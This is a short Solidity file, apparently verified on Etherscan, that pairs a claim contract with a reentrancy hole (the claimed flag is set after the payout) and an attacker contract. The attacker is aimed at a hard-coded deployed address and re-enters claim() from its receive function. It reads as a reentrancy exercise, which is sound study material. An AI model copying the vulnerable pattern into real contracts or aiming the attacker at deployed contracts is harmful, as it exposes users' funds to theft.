/**
 *Submitted for verification at Etherscan.io on 2022-11-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrancee {
  mapping(address => bool) private claims;

  function claim() public {
    if(!claims[msg.sender]) {
      payable(msg.sender).transfer(10000000000000000);
      claims[msg.sender] = true;
    }
  }

  receive() external payable {}
}

contract ReentranceAttacker {
  Reentrancee public reenter;

  uint256 count;

  constructor() {
    reenter = Reentrancee(payable(0x2e88D2D18912313965f46DBECF10039103DC0ECc));
  }

  function attack() public {
    reenter.claim();
  }

  receive() external payable {
    if(count < 2) {
      count++;
      attack();
    }
  }
}